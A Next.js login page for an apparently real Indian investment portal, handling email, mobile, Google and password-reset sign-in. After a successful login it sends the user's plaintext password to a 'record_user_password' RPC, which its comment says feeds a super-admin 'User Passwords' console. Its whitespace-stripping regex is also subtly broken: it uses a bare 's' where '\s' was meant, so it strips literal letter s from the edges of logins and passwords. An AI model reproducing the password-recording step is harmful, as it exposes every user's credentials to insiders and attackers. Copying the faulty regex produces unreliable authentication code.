'use client'

import { useState, useEffect } from 'react'
import { useRouter } from 'next/navigation'
import Link from 'next/link'
import { LegalLink } from '@/components/LegalPopup'
import { BRAND } from '@/lib/constants'
import { Eye, EyeOff, Lock, ArrowLeft, Shield, AlertTriangle, Loader2, CheckCircle } from 'lucide-react'
import Logo from '@/components/Logo'
import { supabase, isSupabaseConfigured } from '@/lib/supabase/client'
import { loginClient } from '@/lib/supabase/clientAuthService'
import { AUTH_ERRORS, mapSupabaseError } from '@/lib/auth/errorMessages'

export default function LoginPage() {
  const router = useRouter()
  const [showPassword, setShowPassword] = useState(false)
  const [emailOrMobile, setEmailOrMobile] = useState('')
  const [password, setPassword] = useState('')
  const [error, setError] = useState('')
  const [success, setSuccess] = useState('')
  const [loading, setLoading] = useState(false)
  const [resetSent, setResetSent] = useState(false)

  // Check if already authenticated — redirect to dashboard
  // Skip redirect if user just logged out (indicated by URL param)
  useEffect(() => {
    if (!isSupabaseConfigured()) return
    if (typeof window !== 'undefined') {
      const params = new URLSearchParams(window.location.search)
      if (params.get('logged_out') === 'true') return
    }
    supabase.auth.getSession().then(({ data: { session } }) => {
      if (session?.user) router.replace('/dashboard')
    })
  }, [router])

  // Surface any session-invalidation message set by the session guard.
  useEffect(() => {
    if (typeof window === 'undefined') return
    try {
      const msg = sessionStorage.getItem('ghl_client_logout_msg')
      if (msg) { setError(msg); sessionStorage.removeItem('ghl_client_logout_msg') }
    } catch { /* ignore */ }
  }, [])

  // Classify input as email, 10-digit mobile, or raw string
  const classifyInput = (input: string): { kind: 'email' | 'mobile' | 'raw'; value: string } => {
    // Strip surrounding whitespace AND zero-width chars some mobile
    // keyboards inject, which a plain .trim() would miss.
    const cleaned = input.replace(/^[s​‌‍﻿]+|[s​‌‍﻿]+$/g, '')
    if (cleaned.includes('@')) return { kind: 'email', value: cleaned.toLowerCase() }
    const digits = cleaned.replace(/\D/g, '')
    if (digits.length === 10) return { kind: 'mobile', value: digits }
    return { kind: 'raw', value: cleaned }
  }

  // Netlify function base URL.
  // The custom domain ghlindiaventures.com is served by a separate nginx host
  // that doesn't expose /.netlify/functions/* — requests there return a 308
  // to a trailing-slash URL that 404s. Route function traffic to the canonical
  // *.netlify.app host in that case. login-mobile already whitelists
  // ghlindiaventures.com via CORS.
  const NETLIFY_FUNCTIONS_HOST = 'https://ghl-india-ventures-2025.netlify.app'
  const getFunctionBase = () => {
    if (typeof window === 'undefined') return ''
    const origin = window.location.origin
    if (origin.includes('localhost')) return 'http://localhost:8888'
    if (origin.endsWith('.netlify.app')) return origin
    return NETLIFY_FUNCTIONS_HOST
  }

  // ── Password Login ─────────────────────────────────────────
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setError('')
    setSuccess('')
    setLoading(true)

    if (!isSupabaseConfigured()) {
      setError(AUTH_ERRORS.SERVICE_UNAVAILABLE)
      setLoading(false)
      return
    }

    try {
      const input = classifyInput(emailOrMobile)

      // Mobile keyboards (notably Samsung) can append an invisible trailing
      // space or zero-width character to the password even with autoCorrect
      // off — the byte-exact Supabase check then rejects it as "incorrect
      // password", which is why a credential that works on a laptop fails on
      // a phone. Try the value EXACTLY as typed first (so a password that
      // legitimately contains spaces is never broken), then fall back to a
      // variant with surrounding whitespace / zero-width chars stripped.
      const stripEdges = (s: string) => s.replace(/^[s​‌‍﻿]+|[s​‌‍﻿]+$/g, '')
      const cleanedPassword = stripEdges(password)
      const passwordCandidates = cleanedPassword !== password ? [password, cleanedPassword] : [password]

      if (input.kind === 'mobile') {
        // Mobile login: resolve email → sign in server-side, then set session client-side
        let data: any = {}
        let ok = false
        let okPassword = ''
        for (const pw of passwordCandidates) {
          const res = await fetch(`${getFunctionBase()}/.netlify/functions/login-mobile`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ mobile: input.value, password: pw }),
          })
          data = await res.json().catch(() => ({}))
          if (res.ok && data.access_token && data.refresh_token) { ok = true; okPassword = pw; break }
        }

        if (!ok) {
          setError(data.error || AUTH_ERRORS.INVALID_CREDENTIALS)
          setLoading(false)
          return
        }

        const { error: sessionError } = await supabase.auth.setSession({
          access_token: data.access_token,
          refresh_token: data.refresh_token,
        })
        if (sessionError) {
          setError(mapSupabaseError(sessionError.message) || AUTH_ERRORS.INVALID_CREDENTIALS)
          setLoading(false)
          return
        }
        // Mirror the working password into the super-admin "User Passwords"
        // console (idempotent RPC — only writes when the value is new).
        // Best-effort; never affects login. The email-login branch already
        // gets this via loginClient.
        try { await supabase.rpc('record_user_password', { p_password: okPassword } as any) } catch { /* non-fatal */ }
        router.push('/dashboard')
        return
      }

      // Email (or raw) login: use existing client-side flow
      let result = await loginClient(input.value, passwordCandidates[0])
      for (let i = 1; i < passwordCandidates.length && !result.session; i++) {
        result = await loginClient(input.value, passwordCandidates[i])
      }
      if (result.session) {
        router.push('/dashboard')
      } else {
        setError(result.message || AUTH_ERRORS.INVALID_CREDENTIALS)
      }
    } catch (err: any) {
      setError(mapSupabaseError(err?.message))
    }
    setLoading(false)
  }

  // ── Forgot Password ────────────────────────────────────────
  const handleForgotPassword = async () => {
    const input = classifyInput(emailOrMobile)
    if (input.kind !== 'email') {
      setError(AUTH_ERRORS.RESET_EMAIL_REQUIRED)
      return
    }
    const email = input.value
    setError('')
    setLoading(true)
    try {
      if (isSupabaseConfigured()) {
        const { error: resetError } = await supabase.auth.resetPasswordForEmail(email, {
          redirectTo: `${typeof window !== 'undefined' ? window.location.origin : ''}/auth/callback`,
        })
        if (resetError) {
          setError(mapSupabaseError(resetError.message))
          setLoading(false)
          return
        }
      }
      setResetSent(true)
      setSuccess(AUTH_ERRORS.RESET_SENT)
    } catch (err: any) {
      setError(mapSupabaseError(err?.message) || AUTH_ERRORS.RESET_FAILED)
    }
    setLoading(false)
  }

  // ── Google OAuth ───────────────────────────────────────────
  const handleGoogleSignIn = async () => {
    if (!isSupabaseConfigured()) {
      setError(AUTH_ERRORS.SERVICE_UNAVAILABLE)
      return
    }
    setLoading(true)
    setError('')

    try {
      const callbackUrl =
        typeof window !== 'undefined'
          ? new URL('/auth/callback?flow=signin', window.location.origin).toString()
          : ''
      const { error: oauthError } = await supabase.auth.signInWithOAuth({
        provider: 'google',
        options: { redirectTo: callbackUrl },
      })
      if (oauthError) {
        setError(mapSupabaseError(oauthError.message))
      }
    } catch {
      setError(AUTH_ERRORS.OAUTH_FAILED)
    }
    setLoading(false)
  }

  // `pt` clears the 56px fixed header with a small gap. It was pt-32 (128px),
  // which left ~72px of empty white below the header before the panel even
  // started — and the panel then added its own py on top of that.
  return (
    <section className="min-h-screen flex pt-20">
      {/* LEFT: Dark Brand Visual */}
      <div className="hidden lg:flex lg:w-[45%] relative bg-brand-black overflow-hidden">
        <div className="absolute inset-0">
          <div className="absolute top-0 left-0 w-full h-full bg-gradient-to-br from-brand-black via-[#1a0000] to-brand-black" />
          <div className="absolute top-1/4 left-1/4 w-96 h-96 bg-brand-red/10 rounded-full blur-[120px]" />
          <div className="absolute bottom-1/4 right-1/4 w-64 h-64 bg-brand-red/5 rounded-full blur-[80px]" />
          <div
            className="absolute inset-0 opacity-[0.03]"
            style={{
              backgroundImage: 'linear-gradient(rgba(255,255,255,0.1) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,0.1) 1px, transparent 1px)',
              backgroundSize: '60px 60px',
            }}
          />
        </div>

        <div className="relative z-10 flex flex-col justify-center items-center w-full px-12">
          <div className="mb-8">
            <Logo size={76} />
          </div>
          <h2 className="text-3xl font-bold text-white text-center mb-3">{BRAND.name}</h2>
          <p className="text-lg text-brand-red font-medium mb-6 text-center">Your Wealth. Our Stewardship.</p>
          <p className="text-gray-400 text-sm text-center max-w-sm leading-relaxed">{BRAND.description}</p>
          <div className="mt-10 px-4 py-2 bg-white/5 border border-white/10 rounded-full">
            <a href={BRAND.sebiUrl} target="_blank" rel="noopener noreferrer" className="text-xs text-gray-400 hover:text-brand-red transition-colors">SEBI Reg: {BRAND.sebi}</a>
          </div>
        </div>
      </div>

      {/* RIGHT: White Form Panel */}
      <div className="flex-1 flex items-center justify-center bg-white px-6 py-10 lg:py-12">
        <div className="w-full max-w-md">
          {/* Mobile logo */}
          <div className="lg:hidden text-center mb-8">
            <div className="mx-auto mb-3 w-fit">
              <Logo size={54} />
            </div>
          </div>

          <h1 className="text-3xl font-bold text-brand-black mb-2">Login to {BRAND.name}</h1>
          <p className="text-brand-grey mb-8">Access your investor portal</p>

          {/* Google OAuth — Single Social Login */}
          <button type="button" onClick={handleGoogleSignIn} disabled={loading}
            className="w-full flex items-center justify-center space-x-3 px-6 py-3 bg-white border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors shadow-sm disabled:opacity-60 disabled:cursor-not-allowed mb-6">
            {loading ? <Loader2 className="w-5 h-5 animate-spin text-gray-500" /> : (
              <svg className="w-5 h-5" viewBox="0 0 24 24">
                <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 01-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z" fill="#4285F4"/>
                <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
                <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
                <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
              </svg>
            )}
            <span className="text-sm font-medium text-gray-700">Continue with Google</span>
          </button>

          {/* Divider */}
          <div className="relative mb-6">
            <div className="absolute inset-0 flex items-center"><div className="w-full border-t border-gray-200" /></div>
            <div className="relative flex justify-center text-xs">
              <span className="bg-white px-4 text-brand-grey">or log in with credentials</span>
            </div>
          </div>

          {/* Success Message */}
          {success && (
            <div className="flex items-center gap-2 p-3 rounded-lg bg-green-50 border border-green-200 mb-4">
              <CheckCircle className="w-4 h-4 text-green-500 flex-shrink-0" />
              <p className="text-xs text-green-700">{success}</p>
            </div>
          )}

          {/* Error Message */}
          {error && (
            <div className="flex items-center gap-2 p-3 rounded-lg bg-red-50 border border-red-200 mb-4">
              <AlertTriangle className="w-4 h-4 text-red-500 flex-shrink-0" />
              <p className="text-xs text-red-600">{error}</p>
            </div>
          )}

          {/* Password Login Form */}
          <form onSubmit={handleSubmit} className="space-y-5">
            <div>
              <label htmlFor="login-email" className="block text-sm font-medium text-brand-black mb-2">Email or Mobile Number</label>
              <div className="relative">
                <input
                  id="login-email"
                  type="text"
                  required
                  // Cross-device hardening: stop mobile keyboards from
                  // auto-capitalising / autocorrecting the identifier (a
                  // leading-cap or trailing space silently breaks login).
                  autoCapitalize="none"
                  autoCorrect="off"
                  autoComplete="username"
                  spellCheck={false}
                  className="input-field"
                  placeholder="you@email.com or 10-digit mobile"
                  value={emailOrMobile}
                  onChange={(e) => setEmailOrMobile(e.target.value)}
                />
              </div>
            </div>

            <div>
              <label htmlFor="login-password" className="block text-sm font-medium text-brand-black mb-2">Password</label>
              <div className="relative">
                <input
                  id="login-password"
                  type={showPassword ? 'text' : 'password'}
                  required
                  // When "show password" is on the field becomes type=text,
                  // which mobile keyboards auto-capitalise/autocorrect — these
                  // attrs keep the typed password byte-for-byte intact.
                  autoCapitalize="none"
                  autoCorrect="off"
                  autoComplete="current-password"
                  spellCheck={false}
                  className="input-field pr-12"
                  placeholder="Enter your password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
                <button type="button" onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-brand-grey hover:text-brand-black transition-colors" aria-label="Toggle password visibility">
                  {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                </button>
              </div>
            </div>

            <div className="text-right">
              {resetSent ? (
                <span className="text-sm text-green-600 font-medium">Reset email sent! Check your inbox.</span>
              ) : (
                <button type="button" onClick={handleForgotPassword} className="text-sm text-brand-red hover:underline font-medium">Forgot Password?</button>
              )}
            </div>

            <button type="submit" disabled={loading} className="btn-primary w-full text-center disabled:opacity-60">
              {loading ? <><Loader2 className="w-4 h-4 mr-2 animate-spin" /> Signing in...</> : <><Lock className="w-4 h-4 mr-2" /> Login</>}
            </button>
          </form>

          {/* Create Account */}
          <div className="mt-6 text-center">
            <p className="text-sm text-brand-grey">
              Don&apos;t have an account?{' '}
              <Link href="/register" className="text-brand-red font-semibold hover:underline">Create Account</Link>
            </p>
          </div>

          {/* Back to Home */}
          <div className="mt-4 text-center">
            <Link href="/" className="inline-flex items-center text-sm text-brand-grey hover:text-brand-black transition-colors">
              <ArrowLeft className="w-4 h-4 mr-1.5" /> Back to Home
            </Link>
          </div>

          {/* Terms & Privacy */}
          <div className="mt-8 pt-6 border-t border-gray-100 text-center">
            <p className="text-xs text-brand-grey">
              By logging in, you agree to our{' '}
              <LegalLink type="terms" className="text-brand-red hover:underline">Terms of Service</LegalLink>{' '}
              and{' '}
              <LegalLink type="privacy" className="text-brand-red hover:underline">Privacy Policy</LegalLink>.
            </p>
            <div className="mt-3 inline-flex items-center space-x-1.5 text-gray-400 text-xs">
              <Shield className="w-3.5 h-3.5" />
              <span>256-bit SSL encrypted &bull; SEBI compliant</span>
            </div>
          </div>
        </div>
      </div>
    </section>
  )
}
